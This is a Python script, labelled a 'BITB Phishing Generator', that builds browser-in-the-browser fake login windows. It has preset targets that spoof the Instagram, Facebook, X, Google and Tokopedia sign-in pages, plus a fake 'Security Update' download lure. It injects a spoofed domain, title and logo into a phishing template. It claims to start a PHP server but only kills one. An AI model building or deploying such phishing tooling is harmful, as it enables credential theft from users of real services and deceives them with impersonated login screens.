import os
import subprocess
import base64
import argparse
import time

def cl(color, text):
    colors = {"blue": "\033[94m", "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m", "end": "\033[0m"}
    return colors.get(color, "") + text + colors["end"]

def open_server(domain_name, dir_name, login_page, site_title, btn_text):
    print(cl("blue", "[*] Setting up BITB for: " + site_title))
    
    if not os.path.exists(f"sites/{dir_name}/{login_page}"):
        print(cl("red", f"[-] Error: Target site directory or {login_page} not found!"))
        return

    try:
        with open(f"sites/{dir_name}/favicon.png", "rb") as image_file:
            encoded_string = base64.b64encode(image_file.read()).decode("utf-8")
    except FileNotFoundError:
        encoded_string = ""

    try:
        with open("main.html", "r") as f:
            template = f.read()
    except FileNotFoundError:
        print(cl("red", "[-] Error: main.html not found!"))
        return

    template = template.replace("XX-TITLE-XX", site_title)
    template = template.replace("XX-DOMAIN-NAME-XX", domain_name)
    template = template.replace("XX-PHISHING-LINK-XX", f"sites/{dir_name}/{login_page}")
    template = template.replace("XX-LOGO-XX", encoded_string)
    template = template.replace("Click me", btn_text)

    with open("index.html", "w") as f:
        f.write(template)

    print(cl("green", "[+] Template generated successfully."))
    print(cl("blue", "[*] Starting PHP Server on port 8080..."))
    
    if os.name != "nt":
        subprocess.run(["pkill", "-f", "php -S 0.0.0.0:8080 router.php"], capture_output=True)
    
    print(cl("green", "[+] BITB Ready!"))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BITB Phishing Generator")
    parser.add_argument("--target", help="Target site (e.g. instagram, facebook)")
    args = parser.parse_args()

    # Predefined targets
    targets = {
        "instagram": ("https://www.instagram.com/accounts/login", "instagram", "index.php", "Instagram", "Login with Instagram"),
        "facebook": ("https://www.facebook.com/login", "facebook", "index.php", "Facebook", "Login with Facebook"),
        "x": ("https://twitter.com/login", "twitter", "index.php", "X", "Login with X"),
        "google": ("https://accounts.google.com/signin", "google", "index.php", "Google", "Login with Google"),
        "tokopedia": ("https://www.tokopedia.com/login", "tokopedia", "index.php", "Tokopedia", "Login with Tokopedia"),
        "download_required": ("http://network-update.local", "download_required", "index.html", "Security Update", "Update & Connect")
    }

    if args.target and args.target in targets:
        open_server(*targets[args.target])
    else:
        print("Please specify a valid target with --target. Available targets: " + ", ".join(targets.keys()))
